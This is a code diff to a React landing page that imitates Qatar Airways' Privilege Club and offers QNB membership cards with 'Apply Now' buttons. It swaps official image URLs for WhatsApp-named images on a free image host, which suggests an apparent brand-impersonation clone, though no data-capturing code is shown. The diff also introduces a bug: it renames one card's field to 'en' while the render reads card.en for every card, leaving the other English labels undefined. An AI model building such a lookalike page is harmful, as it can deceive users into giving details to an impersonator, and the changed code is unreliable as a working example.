@@ -7,17 +7,28 @@ import { Car, Hotel, Plane, ParkingCircle, Gift, Lock, Globe, Trophy, Wallet, Cr
 import Header from "@/components/Header";
 
 const sliderImages = [
-  "https://www.qatarairways.com/content/dam/images/renditions/horizontal-1/campaigns/global/privilege-club/enrollment/enrollment-hero-desktop.jpg",
-  "https://files.manuscdn.com/user_upload_by_module/session_file/310519663840622174/mvcqnwvmOsVNytgX.jpeg",
-  "https://files.manuscdn.com/user_upload_by_module/session_file/310519663840622174/tfabDSrlAgeDEMkL.jpeg",
-  "https://files.manuscdn.com/user_upload_by_module/session_file/310519663840622174/pKwbAVnyXFLmjakC.jpeg",
-  "https://files.manuscdn.com/user_upload_by_module/session_file/310519663840622174/sIrFjeGsgqegGezm.jpeg",
+  "https://i.ibb.co/prbY7X4y/IMG-20260718-WA0011.jpg",
+  "https://i.ibb.co/hRZYJfHN/IMG-20260718-WA0010.jpg",
+  "https://i.ibb.co/LDBRJyyS/IMG-20260718-WA0009.jpg",
+  "https://i.ibb.co/SXj5mWQR/IMG-20260718-WA0008.jpg",
+  "https://i.ibb.co/PzVjfnr0/IMG-20260718-WA0007.jpg",
+  "https://i.ibb.co/NgqDV0LF/IMG-20260718-WA0006.jpg",
+  "https://i.ibb.co/rKNQp5t5/IMG-20260718-WA0005.jpg",
+  "https://i.ibb.co/mCNvcQ2s/IMG-20260718-WA0001.jpg",
+  "https://i.ibb.co/gMWpGhwT/IMG-20260718-WA0002.jpg",
+  "https://i.ibb.co/ycrZw6z1/IMG-20260718-WA0003.jpg",
+  "https://i.ibb.co/FPSMwx7/IMG-20260718-WA0004.jpg",
+  "https://i.ibb.co/BH4fNcs0/h2-uefa-2024.jpg",
+  "https://i.ibb.co/2707Nb2Z/h2-jet-ski-qatar.jpg",
+  "https://i.ibb.co/fzZ25gZW/h2-f1-v2.jpg",
+  "https://i.ibb.co/s9w4ZzdB/PHL.jpg",
+  "https://i.ibb.co/x8Kq5Nfr/h2-visa-cug-china.jpg",
 ];
 
 const cards = [
   { bank: "qnb", nameAr: "العضوية الفضية", nameEn: "Silver Membership", logo: "https://i.ibb.co/k6GT9TkG/IMG-20260714-WA0012.jpg", img: "https://files.manuscdn.com/user_upload_by_module/session_file/310519663799792395/GNPJtLJsmUHfUddx.png", bgColor: "#ffffff" },
   { bank: "qnb", nameAr: "العضوية الذهبية", nameEn: "Gold Membership", logo: "https://i.ibb.co/k6GT9TkG/IMG-20260714-WA0012.jpg", img: "https://files.manuscdn.com/user_upload_by_module/session_file/310519663799792395/UJpzjPxptKCKuynJ.png", bgColor: "#ffffff" },
-  { bank: "qnb", nameAr: "العضوية البلاتينية", nameEn: "Platinum Membership", logo: "https://i.ibb.co/k6GT9TkG/IMG-20260714-WA0012.jpg", img: "https://files.manuscdn.com/user_upload_by_module/session_file/310519663799792395/hQqpxtvPQfJHewTY.png", bgColor: "#ffffff" },
+  { bank: "qnb", nameAr: "العضوية البلاتينية", en: "Platinum Membership", logo: "https://i.ibb.co/k6GT9TkG/IMG-20260714-WA0012.jpg", img: "https://files.manuscdn.com/user_upload_by_module/session_file/310519663799792395/hQqpxtvPQfJHewTY.png", bgColor: "#ffffff" },
 ];
 
 export default function Home() {
@@ -63,7 +74,7 @@ export default function Home() {
   };
 
   return (
-    <div dir={isArabic ? "rtl" : "ltr"} style={{ backgroundColor: '#f4f4f4', minHeight: '100vh' }}>
+    <div dir={isArabic ? "rtl" : "ltr"} style={{ margin: 0, padding: 0, fontFamily: 'sans-serif', backgroundColor: '#f4f4f4', minHeight: '100vh' }}>
       <Header />
       
       {/* Slider Section */}
@@ -86,7 +97,7 @@ export default function Home() {
             alt="Privilege Club Banner"
           />
         ))}
-        <div style={{ position: 'absolute', top: 0, left: 0, width: '100%', height: '100%', background: 'rgba(0,0,0,0.3)', z-index: 2 }}></div>
+        <div style={{ position: 'absolute', top: 0, left: 0, width: '100%', height: '100%', background: 'rgba(0,0,0,0.3)', zIndex: 2 }}></div>
         <div style={{ position: 'relative', zIndex: 3, textAlign: 'center', color: 'white', padding: '20px', maxWidth: '800px' }}>
           <h1 style={{ fontSize: '36px', fontWeight: 'bold', marginBottom: '10px', textShadow: '0 2px 4px rgba(0,0,0,0.5)' }}>
             {isArabic ? "انضم إلى نادي الامتياز وابدأ بجمع نقاط أفيوس اليوم" : "Join Privilege Club to start earning Avios today"}
@@ -182,8 +193,8 @@ export default function Home() {
             }}
             onClick={() => handleCardClick(idx, card.bank)}
           >
-            {selectedCard === idx && <div style={{ position: 'absolute', top: '-10px', right: '-10px', background: '#8C0032', color: white, width: '24px', height: '24px', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '14px', boxShadow: '0 2px 5px rgba(0,0,0,0.2)', zIndex: 10 }}>✔</div>}
-            <span style={{ fontSize: '20px', fontWeight: 'bold', marginBottom: '15px', color: '#8C0032' }}>{isArabic ? card.nameAr : card.nameEn}</span>
+            {selectedCard === idx && <div style={{ position: 'absolute', top: '-10px', right: '-10px', background: '#8C0032', color: 'white', width: '24px', height: '24px', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '14px', boxShadow: '0 2px 5px rgba(0,0,0,0.2)', zIndex: 10 }}>✔</div>}
+            <span style={{ fontSize: '20px', fontWeight: 'bold', marginBottom: '15px', color: '#8C0032' }}>{isArabic ? card.nameAr : card.en}</span>
             <img src={card.img} style={{ width: '100%', maxWidth: '300px', marginBottom: '20px' }} alt="Credit Card" />
             <button style={{ backgroundColor: '#8C0032', color: '#ffffff', padding: '12px 40px', border: 'none', borderRadius: '25px', fontSize: '16px', fontWeight: 'bold', cursor: 'pointer' }}>
               {isArabic ? "قدم الآن" : "Apply Now"}
